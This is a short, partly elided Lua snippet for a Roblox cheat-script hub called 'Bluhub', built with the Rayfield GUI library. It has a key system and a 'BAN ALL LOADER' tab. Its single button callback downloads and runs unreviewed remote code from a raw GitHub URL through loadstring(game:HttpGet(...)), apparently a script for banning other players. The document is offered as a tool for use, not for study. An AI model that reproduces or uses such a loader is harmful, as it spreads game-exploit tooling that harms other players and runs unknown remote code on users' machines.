...
local Window = Rayfield:CreateWindow({
    ...
    KeySettings = {
       Title = "Bluhub key",
       Subtitle = "Key System",
       Note = "BAN ALL SCRIPT + LOAD MUSIC ", -- Use this to tell the user how to get a key
 ...
 local Tab = Window:CreateTab("BAN ALL LOADER", 4483362458) -- Title, Image
 ...
 local Button = Tab:CreateButton({
    ...
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/p7reeessssssxxxx/hello/refs/heads/main/DIDDENbluds.lua"))() 
    end,
 })
